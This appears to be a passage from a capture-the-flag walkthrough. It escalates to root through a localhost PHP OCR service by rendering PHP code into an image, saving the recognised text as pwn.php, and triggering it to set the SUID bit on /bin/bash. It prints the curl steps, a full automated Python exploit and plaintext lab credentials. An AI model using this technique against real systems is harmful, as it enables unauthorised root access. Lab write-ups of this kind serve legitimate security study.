| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-auth: 
| HTTP/1.0 401 Unauthorized\x0D
|_  Basic realm=OCR Protected
```

- check processes we see the site is hosted by root 
![[Pasted image 20260707092517.png]]

```
ps -aux | grep "ocr"

---OUTPUT---
root        1397  0.0  0.0   2800  1808 ?        Ss   10:17   0:00 /bin/sh -c /root/.scripts/start_ocr4.sh
root        1398  0.0  0.0   7340  3616 ?        S    10:17   0:10 /bin/bash /root/.scripts/start_ocr4.sh
root        1403  0.0  0.7 228488 31436 ?        S    10:17   0:00 php -S 127.0.0.1:8001 -t /root/ocr4/
walter     49870  0.0  0.0   6544  2284 pts/0    S+   13:25   0:00 grep --color=auto ocr

```

- urthermore on testing in the browser we see whatever is saved is saved into the path `/saved/filename` which we can also access via the url.
![[Pasted image 20260707093953.png]]

![[Pasted image 20260707094012.png]]

- We can access from url:
![[Pasted image 20260707094059.png]]

- Reading the network packet in devtools we see it is a png encoded in b64:
```
{
	"canvas_image": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAfQAAADICAYAAAAeGRPoAAAgAElEQVR4Xu2dC9AkVXmG98rCLhe5C4FwFWKpKEiiEkHQGCFEQzCxFLVCqfESIEaQkkgkFwUiEZJYihYYKSsSo0GUiBWKcDEQJJaIBhQJy0UQsyx7A3bZ3f+e9/vpmfT0np7p7nN65nTPM1VTs7N/n3O+7/nO9NvnvnABLwhAAAIQgAAEGk9gYeM9wAEIQAACEIAABBYg6FQCCEAAAhCAQAsIIOgtCCIuQAACEIAABBB06gAEIAABCECgBQQQ9BYEERcgAAEIQAACCDp1AAIQgAAEINACAgh6C4KICxCAAAQgAAEEnToAAQhAAAIQaAEBBL0FQcQFCEAAAhCAAIJOHYAABCAAAQi0gACC3oIg4gIEIAABCEAAQacOQAACEIAABFpAAEFvQRBxAQIQgAAEIICgUwcgAAE
	
	
<SNIP>
	
	CC7gmQ5BCAAAQgAIEYCCDoMUQBGyAAAQhAAAKeBBB0T4AkhwAEIAABCMRAAEGPIQrYAAEIQAACEPAkgKB7AiQ5BCAAAQhAIAYCCHoMUcAGCEAAAhCAgCcBBN0TIMkhAAEIQAACMRBA0GOIAjZAAAIQgAAEPAkg6J4ASQ4BCEAAAhCIgQCCHkMUsAECEIAABCDgSQBB9wRIcghAAAIQgEAMBBD0GKKADRCAAAQgAAFPAgi6J0CSQwACEIAABGIggKDHEAVsgAAEIAABCHgSQNA9AZIcAhCAAAQgEAMBBD2GKGADBCAAAQhAwJMAgu4JkOQQgAAEIACBGAgg6DFEARsgAAEIQAACngQQdE+AJIcABCAAAQjEQABBjyEK2AABCEAAAhDwJICgewIkOQQgAAEIQCAGAgh6DFHABghAAAIQgIAnAQTdEyDJIQABCEAAAjEQQNBjiAI2QAACEIAABDwJIOieAEkOAQhAAAIQiIEAgh5DFLABAhCAAAQg4EkAQfcESHIIQAACEIBADAT+D1Es+Zt9dxqWAAAAAElFTkSuQmCC"
}
```

- So we can upload our file with the curl command but each curl command creates a new session. We need to grab the phpsession id identifier to then save the file with curl too.

- FIrst lets create our payload in a png file:
```
cat final.py 

---OUTPUT---
from PIL import Image, ImageDraw, ImageFont

img = Image.new('RGB', (900, 200), color='white')
draw = ImageDraw.Draw(img)
font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf', 28)
draw.text((10, 80), "<?php system('chmod +s /bin/bash'); ?>", fill='black', font=font)
img.save('payload.png')
```

- can open it to see it visually

- Run it to create the png:
```
python3 final.py
```

- The upload the png via curl and grab the otc id:
```
curl -s -u walter:JbhHDAEgXvri3! -c cookies.txt \
  --data-urlencode "canvas_image=data:image/png;base64,$(base64 -w0 payload.png)" \
  http://127.0.0.1:8001/ -o ocr_result.html
```

- Find the id:
```
grep -i "ocr_id\|filename\|notice" ocr_result.html

---OUTPUT---
        .notice {
        .notice.error { color: var(--error); }
        .notice.success { color: var(--ink); }
                <input type="hidden" name="ocr_id" value="ocr_6a4d02b10b6652.50455615">
                    <input type="text" name="filename" placeholder="result.txt" required>
```

- We grab the id and then we can use it to save the upload with a php file name
```
curl -s -u walter:JbhHDAEgXvri3! -b cookies.txt \
  --data-urlencode "ocr_id=ocr_6a4d02b10b6652.50455615" \
  --data-urlencode "filename=pwn.php" \
  --data-urlencode "save_output=Save" \
  http://127.0.0.1:8001/ -o save_result.html
```

- Confirm it is saved:
```
grep -i "notice\|error\|success" save_result.html

---OUTPUT---

            --error: #9a2424;
        .notice {
        .notice.error { color: var(--error); }
        .notice.success { color: var(--ink); }
            <p class="notice success reveal">Saved as: saved/pwn.php</p>
```

- Now we can access it to trigger the exploit: http://127.0.0.1:8001/saved/pwn.php
- Can see the change in the bash executable with the suid bit:
![[Pasted image 20260707094710.png]]

- Execute the bash as a runnign shell to run as root:
```
/bin/bash -p
```
![[Pasted image 20260707094810.png]]

- I grab the root flag:
![[Pasted image 20260707094852.png]]

### Auto PrivEsc exploit:

- After creating the ssh tunnel we can pass this exploit to perform the manual actions above automatically:
```
cat privesc.py  

---OUTPUT----
#!/usr/bin/env python3
import requests
import base64
import re
from PIL import Image, ImageDraw, ImageFont

OCR_URL = "http://127.0.0.1:8001/"
AUTH = ('walter', 'JbhHDAEgXvri3!')

def make_payload_image(text, path='payload.png'):
    img = Image.new('RGB', (900, 200), color='white')
    draw = ImageDraw.Draw(img)
    font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf', 28)
    draw.text((10, 80), text, fill='black', font=font)
    img.save(path)
    return path

def run():
    session = requests.Session()
    session.auth = AUTH

    png_path = make_payload_image("<?php system('chmod +s /bin/bash'); ?>")

    with open(png_path, 'rb') as f:
        b64 = base64.b64encode(f.read()).decode()

    resp = session.post(OCR_URL, data={
        'canvas_image': f'data:image/png;base64,{b64}'
    })

    match = re.search(r'name="ocr_id" value="([^"]+)"', resp.text)
    if not match:
        print("[-] OCR failed or ocr_id not found. Response snippet:")
        idx = resp.text.find('notice')
        print(resp.text[idx:idx+200])
        return

    ocr_id = match.group(1)
    print(f"[+] OCR succeeded, ocr_id: {ocr_id}")

    filename = 'pwn.php'
    save_resp = session.post(OCR_URL, data={
        'ocr_id': ocr_id,
        'filename': filename,
        'save_output': 'Save'
    })

    if 'notice success' in save_resp.text or 'success' in save_resp.text.lower():
        print("[+] Save succeeded")
    else:
        idx = save_resp.text.find('notice')
        print("[-] Save may have failed:")
        print(save_resp.text[idx:idx+200])
        return

    saved_path = OCR_URL + f'saved/{filename}'
    print(f"[+] Saved file path: {saved_path}")

    trigger = session.get(saved_path)
    print(f"[+] Trigger response ({trigger.status_code}):")
    print(trigger.text[:300])

if __name__ == '__main__':
    run()
```